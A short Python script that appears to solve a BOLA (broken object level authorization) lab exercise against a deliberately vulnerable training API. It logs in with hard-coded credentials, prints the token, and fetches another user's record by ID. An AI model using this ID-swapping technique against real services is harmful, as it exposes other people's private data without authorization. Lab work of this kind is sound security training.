import requests
from requests.auth import HTTPBasicAuth

# === Global Variables ===
USERNAME = "natasha_romanoff"
PASSWORD = "blackwidow456"

# === API Base URL ===
BASE_URL = "https://rest.e-hacking.de/rest-api-sec/vuln_users"


def authenticate(username: str, password: str) -> str:
    """
    Authenticate with Basic Auth to fetch a Bearer token.
    """
    url = f"{BASE_URL}/authenticate?verifier=bola-1"
    response = requests.post(url, data={"username": username, "password": password})
    response.raise_for_status()
    print(response.json())
    token = response.json().get("access_token")
    if not token:
        raise ValueError("Authentication failed or no access token received.")
    return token


def get_user_info(token: str, id: int):
    """
    Get the authenticated user's information using /users/user.
    """
    url = f"{BASE_URL}/users/user/{id}?verifier=bola-1"
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(url, headers=headers)
    print(response.json())
    response.raise_for_status()
    return response.json()


def main():
    print("[*] Authenticating...")
    token = authenticate(USERNAME, PASSWORD)
    print(f"[+] Access Token: {token}")

    print("[*] Fetching user info...")
    user_info = get_user_info(token, 4)
    print(f"User ID: {user_info.get('id')}")
    print(f"Role: {user_info.get('role')}")


if __name__ == "__main__":
    main()
